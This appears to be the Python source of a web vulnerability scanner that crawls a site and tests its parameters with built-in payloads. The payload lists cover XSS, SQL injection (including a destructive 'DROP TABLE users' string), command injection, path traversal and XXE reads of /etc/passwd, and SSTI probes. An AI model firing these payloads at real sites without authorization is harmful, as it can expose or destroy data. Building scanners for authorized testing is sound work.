from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict
import re
import threading
import time
import hashlib
import logging
import requests
from pathlib import Path
from urllib.parse import urlparse, urljoin, parse_qs
from abc import ABC, abstractmethod

logger = logging.getLogger("intelligent_scanner")
if not logger.handlers:
    log_dir = Path.home() / ".mod" / "logs"
    log_dir.mkdir(parents=True, exist_ok=True)
    stream_handler = logging.StreamHandler()
    file_handler = logging.FileHandler(log_dir / "intelligent_scanner.log")
    formatter = logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s")
    stream_handler.setFormatter(formatter)
    file_handler.setFormatter(formatter)
    logger.addHandler(stream_handler)
    logger.addHandler(file_handler)
logger.setLevel(logging.DEBUG)


class ParameterType(Enum):
    """Parameter type classification for injection testing."""
    STRING = "string"
    INTEGER = "integer"
    BOOLEAN = "boolean"
    DATE = "date"
    EMAIL = "email"
    URL = "url"
    FILE = "file"
    UNKNOWN = "unknown"


class VulnerabilityConfidence(Enum):
    """Vulnerability detection confidence levels."""
    CONFIRMED = 1.0
    HIGH = 0.9
    MEDIUM = 0.7
    LOW = 0.5
    UNLIKELY = 0.2


@dataclass
class Parameter:
    """HTTP parameter with type information and injection points.
    
    Attributes:
        name: Parameter name.
        value: Parameter value.
        param_type: Detected parameter type.
        location: Parameter location (query, post, header, etc.).
        url: Source URL where parameter was found.
        possible_injection_points: List of test payloads.
    """
    name: str
    value: str
    param_type: ParameterType
    location: str
    url: str
    possible_injection_points: List[str] = field(default_factory=list)


@dataclass
class SiteMap:
    """Site structure and parameter mapping.
    
    Attributes:
        urls: All discovered URLs.
        parameters: Parameters grouped by name.
        forms: Form metadata.
        patterns: Detected URL patterns.
    """
    urls: Set[str] = field(default_factory=set)
    parameters: Dict[str, List[Parameter]] = field(default_factory=lambda: defaultdict(list))
    forms: List[Dict] = field(default_factory=list)
    patterns: Dict[str, str] = field(default_factory=dict)


class ParameterAnalyzer:
    """Detect parameter types and generate injection test points."""
    
    REGEX_PATTERNS = {
        ParameterType.INTEGER: r'^\d+$',
        ParameterType.BOOLEAN: r'^(true|false)$',
        ParameterType.DATE: r'^\d{4}-\d{2}-\d{2}',
        ParameterType.EMAIL: r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
        ParameterType.URL: r'^https?://',
        ParameterType.FILE: r'^[a-zA-Z0-9._-]+\.(jpg|png|pdf|doc|txt)$',
    }
    
    INJECTION_POINTS = {
        ParameterType.INTEGER: ['0', '-1', '99999', '1 OR 1=1', '1; DROP TABLE users--'],
        ParameterType.STRING: ['', "' OR '1'='1", '"OR"1"="1', '<script>alert(1)</script>'],
        ParameterType.BOOLEAN: ['true', 'false', '1', '0'],
        ParameterType.EMAIL: ['admin@example.com', "' OR '1'='1@example.com"],
        ParameterType.URL: ['http://localhost', 'http://127.0.0.1', 'file:///etc/passwd'],
        ParameterType.FILE: ['../../../../etc/passwd', '..\\..\\..\\windows\\win.ini'],
    }
    
    @staticmethod
    def detect_parameter_type(value: str) -> ParameterType:
        """Detect parameter type by analyzing value pattern.
        
        Args:
            value: Parameter value to analyze.
            
        Returns:
            Detected ParameterType.
        """
        if not value or not isinstance(value, str):
            return ParameterType.UNKNOWN
        
        try:
            for param_type, pattern in ParameterAnalyzer.REGEX_PATTERNS.items():
                if re.match(pattern, value, re.IGNORECASE):
                    logger.debug(f"Detected {param_type.value} type for value '{value[:20]}'")
                    return param_type
            
            return ParameterType.STRING
        except Exception as e:
            logger.exception(f"Error detecting parameter type: {e}")
            return ParameterType.UNKNOWN
    
    @staticmethod
    def get_injection_points(param: Parameter) -> List[str]:
        """Generate test injection points for parameter.
        
        Args:
            param: Parameter to generate points for.
            
        Returns:
            List of test payloads.
        """
        try:
            points = ParameterAnalyzer.INJECTION_POINTS.get(param.param_type, [])
            logger.debug(f"Generated {len(points)} injection points for {param.name}")
            return points
        except Exception as e:
            logger.exception(f"Error generating injection points: {e}")
            return []


class PayloadGenerator:
    """Generate vulnerability-specific test payloads."""
    
    XSS_PAYLOADS = {
        'context_html': [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
        ],
        'context_attribute': [
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
        ],
        'context_javascript': [
            '";alert(1);"',
            "';alert(1);'",
        ]
    }
    
    SQL_PAYLOADS = {
        'integer': [
            " OR 1=1--",
            " AND 1=2 UNION SELECT 1,2,3--",
            " AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        ],
        'string': [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "' AND SLEEP(5)--",
        ]
    }
    
    RCE_PAYLOADS = {
        'linux': [
            "; id;",
            "| whoami",
            "` whoami `",
        ],
        'windows': [
            "; dir;",
            "| whoami",
        ]
    }
    
    SSTI_PAYLOADS = [
        '{{7*7}}', '${7*7}', '<%=7*7%>',
        '#{7*7}', '{7*7}', '[=7*7=]'
    ]
    
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    ]
    
    @staticmethod
    def generate_payloads(param: Parameter, vulnerability_type: str) -> List[str]:
        """Generate payloads for specific vulnerability type.
        
        Args:
            param: Target parameter.
            vulnerability_type: Type of vulnerability (XSS, SQL, RCE, SSTI, XXE).
            
        Returns:
            List of test payloads.
        """
        try:
            payloads = []
            param_type = param.param_type.value
            
            if vulnerability_type == 'XSS':
                for context_payloads in PayloadGenerator.XSS_PAYLOADS.values():
                    payloads.extend(context_payloads)
            
            elif vulnerability_type == 'SQL':
                key = 'integer' if param_type == 'integer' else 'string'
                payloads = PayloadGenerator.SQL_PAYLOADS.get(key, [])
            
            elif vulnerability_type == 'RCE':
                os_type = 'linux' if '/' in param.value else 'windows'
                payloads = PayloadGenerator.RCE_PAYLOADS.get(os_type, [])
            
            elif vulnerability_type == 'SSTI':
                payloads = PayloadGenerator.SSTI_PAYLOADS
            
            elif vulnerability_type == 'XXE':
                payloads = PayloadGenerator.XXE_PAYLOADS
            
            logger.debug(f"Generated {len(payloads)} payloads for {vulnerability_type}")
            return payloads
        except Exception as e:
            logger.exception(f"Error generating payloads: {e}")
            return []


class ResponseAnalyzer:
    """Analyze HTTP responses to detect successful injections."""
    
    SQL_ERROR_PATTERNS = [
        r'SQL syntax', r'MySQL', r'PostgreSQL', r'ORA-',
        r'SQLSTATE', r'Unclosed quotation',
    ]
    
    RCE_INDICATORS = [
        r'uid=\d+', r'gid=\d+', r'root:',
        r'C:\\', r'Windows',
    ]
    
    @staticmethod
    def calculate_response_hash(content: str) -> str:
        """Generate MD5 hash of response content.
        
        Args:
            content: Response content.
            
        Returns:
            MD5 hash string.
        """
        try:
            return hashlib.md5(content.encode()).hexdigest()
        except Exception as e:
            logger.exception(f"Error calculating hash: {e}")
            return ""
    
    @staticmethod
    def detect_injection_success(
        original_response: str,
        injected_response: str,
        payload: str,
        vuln_type: str
    ) -> Tuple[bool, float]:
        """Detect if injection payload was successful.
        
        Args:
            original_response: Response to benign request.
            injected_response: Response with malicious payload.
            payload: Injection payload used.
            vuln_type: Vulnerability type (XSS, SQL, RCE, etc.).
            
        Returns:
            Tuple of (is_vulnerable, confidence_score).
        """
        try:
            if original_response == injected_response:
                return False, 0.0
            
            if vuln_type == 'XSS':
                if payload in injected_response or '<script>' in injected_response:
                    return True, 0.95
                
                if len(injected_response) > len(original_response) * 1.5:
                    return True, 0.7
            
            elif vuln_type == 'SQL':
                for pattern in ResponseAnalyzer.SQL_ERROR_PATTERNS:
                    if re.search(pattern, injected_response, re.IGNORECASE):
                        return True, 0.9
                
                if ' UNION SELECT ' in payload and len(injected_response) != len(original_response):
                    return True, 0.8
            
            elif vuln_type == 'RCE':
                for indicator in ResponseAnalyzer.RCE_INDICATORS:
                    if re.search(indicator, injected_response):
                        return True, 0.95
            
            elif vuln_type == 'SSTI':
                if '49' in injected_response or '7777777' in injected_response:
                    return True, 0.95
            
            elif vuln_type == 'XXE':
                if 'root:' in injected_response or '/bin/bash' in injected_response:
                    return True, 0.95
            
            response_diff = abs(len(injected_response) - len(original_response))
            if response_diff > 100:
                return True, 0.6
            
            return False, 0.0
        except Exception as e:
            logger.exception(f"Error detecting injection: {e}")
            return False, 0.0
    
    @staticmethod
    def extract_evidence(response: str, payload: str) -> str:
        """Extract evidence snippet from response.
        
        Args:
            response: Response content.
            payload: Injection payload.
            
        Returns:
            Evidence snippet.
        """
        try:
            lines = response.split('\n')
            for line in lines:
                if len(line) > 50:
                    return line[:100]
            
            return response[:200]
        except Exception as e:
            logger.exception(f"Error extracting evidence: {e}")
            return ""


class SiteMapper:
    """Crawl websites to discover parameters and endpoints."""
    
    LINK_PATTERNS = {
        'urls': r'href=["\']([^"\']+)["\']',
        'forms': r'<form[^>]*action=["\']([^"\']+)["\']',
    }
    
    PARAMETER_TAGS = ['input', 'textarea', 'select']
    
    def __init__(self, base_url: str, session: Optional[requests.Session] = None, timeout: int = 10):
        """Initialize SiteMapper with base URL.
        
        Args:
            base_url: Starting URL for crawling.
            session: Optional requests Session (default: new Session).
            timeout: Request timeout in seconds.
        """
        self.base_url = base_url
        self.session = session or requests.Session()
        self.timeout = timeout
        self.visited_urls = set()
        self.site_map = SiteMap()
        logger.debug(f"Initialized SiteMapper for {base_url}")
    
    def crawl_site(self, max_depth: int = 2, max_pages: int = 50) -> SiteMap:
        """Crawl website to discover endpoints and parameters.
        
        Args:
            max_depth: Maximum crawl depth.
            max_pages: Maximum pages to crawl.
            
        Returns:
            SiteMap with discovered structure.
        """
        try:
            queue = [(self.base_url, 0)]
            base_domain = urlparse(self.base_url).netloc
            
            while queue and len(self.visited_urls) < max_pages:
                url, depth = queue.pop(0)
                
                if url in self.visited_urls or depth > max_depth:
                    continue
                
                if urlparse(url).netloc != base_domain:
                    continue
                
                try:
                    response = self.session.get(url, timeout=self.timeout)
                    self.visited_urls.add(url)
                    self.site_map.urls.add(url)
                    
                    self._extract_parameters(url, response.text)
                    new_links = self._extract_links(response.text, url)
                    for link in new_links:
                        if link not in self.visited_urls:
                            queue.append((link, depth + 1))
                    
                    logger.debug(f"Crawled {url} (depth={depth})")
                
                except Exception as e:
                    logger.warning(f"Error crawling {url}: {e}")
                    continue
            
            logger.info(f"Completed crawl: {len(self.site_map.urls)} pages, {len(self.site_map.parameters)} parameters")
            return self.site_map
        
        except Exception as e:
            logger.exception(f"Error in site crawl: {e}")
            return self.site_map
    
    def _extract_parameters(self, url: str, html: str) -> None:
        """Extract parameters from URL and HTML forms.
        
        Args:
            url: Source URL.
            html: HTML content.
        """
        try:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            for name, values in query_params.items():
                for value in values:
                    param_type = ParameterAnalyzer.detect_parameter_type(value)
                    param = Parameter(
                        name=name,
                        value=value,
                        param_type=param_type,
                        location='query',
                        url=url,
                    )
                    param.possible_injection_points = ParameterAnalyzer.get_injection_points(param)
                    self.site_map.parameters[name].append(param)
            
            form_pattern = r'<form[^>]*>(.*?)</form>'
            for form_match in re.finditer(form_pattern, html, re.DOTALL):
                form_content = form_match.group(1)
                input_pattern = r'<input[^>]*name=["\']?([a-zA-Z0-9_-]+)["\']?[^>]*value=["\']?([^"\']*)["\']?'
                
                for input_match in re.finditer(input_pattern, form_content):
                    name = input_match.group(1)
                    value = input_match.group(2) or ''
                    param_type = ParameterAnalyzer.detect_parameter_type(value)
                    param = Parameter(
                        name=name,
                        value=value,
                        param_type=param_type,
                        location='post',
                        url=url,
                    )
                    self.site_map.parameters[name].append(param)
            
            logger.debug(f"Extracted parameters from {url}")
        
        except Exception as e:
            logger.exception(f"Error extracting parameters from {url}: {e}")
    
    def _extract_links(self, html: str, base_url: str) -> List[str]:
        """Extract links from HTML.
        
        Args:
            html: HTML content.
            base_url: Base URL for relative links.
            
        Returns:
            List of absolute URLs.
        """
        try:
            links = []
            
            for link in re.findall(self.LINK_PATTERNS['urls'], html):
                absolute_url = urljoin(base_url, link)
                if absolute_url not in self.visited_urls:
                    links.append(absolute_url)
            
            logger.debug(f"Extracted {len(links)} links from {base_url}")
            return links
        
        except Exception as e:
            logger.exception(f"Error extracting links: {e}")
            return []


class IntelligentScanner:
    """Orchestrate intelligent scanning across discovered site structure."""
    
    VULNERABILITY_TYPES = ['XSS', 'SQL', 'SSTI', 'RCE', 'XXE']
    
    def __init__(self, session: Optional[requests.Session] = None, timeout: int = 10):
        """Initialize IntelligentScanner.
        
        Args:
            session: Optional requests Session (default: new Session).
            timeout: Request timeout in seconds.
        """
        self.session = session or requests.Session()
        self.timeout = timeout
        self.site_map = None
        logger.debug("Initialized IntelligentScanner")
    
    def scan_intelligent(self, base_url: str, max_pages: int = 50, max_depth: int = 2) -> List[Dict]:
        """Perform intelligent security scanning on target URL.
        
        Args:
            base_url: Target URL to scan.
            max_pages: Maximum pages to crawl.
            max_depth: Maximum crawl depth.
            
        Returns:
            List of discovered vulnerabilities.
        """
        try:
            vulnerabilities = []
            
            logger.info(f"Starting intelligent scan of {base_url}")
            print("📡 Stage 1: Site Mapping...")
            
            mapper = SiteMapper(base_url, self.session, self.timeout)
            self.site_map = mapper.crawl_site(max_depth=max_depth, max_pages=max_pages)
            
            print(f"✅ Found {len(self.site_map.urls)} URLs")
            print(f"✅ Found {len(self.site_map.parameters)} unique parameters")
            logger.info(f"Site mapping complete: {len(self.site_map.urls)} URLs, {len(self.site_map.parameters)} parameters")
            
            print("\n🔍 Stage 2: Intelligent Payload Testing...")
            
            for param_name, params in self.site_map.parameters.items():
                if not params:
                    continue
                
                param = params[0]
                
                for vuln_type in self.VULNERABILITY_TYPES:
                    try:
                        payloads = PayloadGenerator.generate_payloads(param, vuln_type)
                        
                        for payload in payloads:
                            vuln = self._test_payload(param, payload, vuln_type)
                            if vuln:
                                vulnerabilities.append(vuln)
                                logger.warning(f"Found {vuln_type} in {param_name}")
                    
                    except Exception as e:
                        logger.exception(f"Error testing {vuln_type} on {param_name}: {e}")
                        continue
            
            logger.info(f"Scan complete: {len(vulnerabilities)} vulnerabilities found")
            return vulnerabilities
        
        except Exception as e:
            logger.exception(f"Error in intelligent scan: {e}")
            return []
    
    def _test_payload(self, param: Parameter, payload: str, vuln_type: str) -> Optional[Dict]:
        """Test single payload against parameter.
        
        Args:
            param: Target parameter.
            payload: Injection payload.
            vuln_type: Vulnerability type.
            
        Returns:
            Vulnerability details if found, None otherwise.
        """
        try:
            original_url = param.url
            modified_url = original_url.replace(f"{param.name}={param.value}", f"{param.name}={payload}")
            
            original_response = self.session.get(original_url, timeout=self.timeout).text
            injected_response = self.session.get(modified_url, timeout=self.timeout).text
            
            is_vulnerable, confidence = ResponseAnalyzer.detect_injection_success(
                original_response,
                injected_response,
                payload,
                vuln_type
            )
            
            if is_vulnerable and confidence > 0.5:
                evidence = ResponseAnalyzer.extract_evidence(injected_response, payload)
                
                result = {
                    'type': vuln_type,
                    'parameter': param.name,
                    'url': param.url,
                    'payload': payload,
                    'confidence': confidence,
                    'evidence': evidence
                }
                
                logger.debug(f"Payload tested: {vuln_type}/{param.name} (confidence={confidence})")
                return result
        
        except Exception as e:
            logger.exception(f"Error testing payload: {e}")
        
        return None
